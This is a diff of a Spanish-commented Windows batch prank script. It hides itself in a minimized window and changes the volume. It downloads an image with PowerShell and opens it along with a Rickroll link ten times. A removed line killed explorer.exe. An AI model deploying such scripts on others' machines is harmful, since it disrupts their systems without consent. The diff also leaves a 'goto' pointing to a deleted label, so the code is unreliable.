@@ -9,17 +9,28 @@ if "%1"=="hidden" goto hidden
 start /min cmd /c "%~f0 hidden"
 exit
 :: sube el volumen al 100%
-nircmd.exe setsysvolume 65535
+nircmd.exe setsysvolume 50000
 
 :hidden
 
 :: Cerrar el Explorador de archivos (oculta barra de tareas y escritorio)
-taskkill /f /im explorer.exe
+::taskkill /f /im explorer.exe
 
-:: Bucle infinito para abrir imágenes y páginas web
-:loop
-start https://www.youtube.com/watch?v=dQw4w9WgXcQ
-start 
+rem Configurar la ruta de la imagen en la carpeta temporal
+set "imagen=%temp%\bormilla.jpg"
+
+rem Descargar la imagen desde internet usando PowerShell
+powershell -command "(New-Object System.Net.WebClient).DownloadFile('https://images.app.goo.gl/VTzshHXwXuejyQPr5', '%imagen%')"
+
+
+set "repeticiones=10"
+
+
+for /L %%i in (1,1,%repeticiones%) do (
+    start "" "%imagen%"
+    start https://www.youtube.com/watch?v=dQw4w9WgXcQ  
+)
+
 
 timeout /t 1 /nobreak >nul
 goto loop
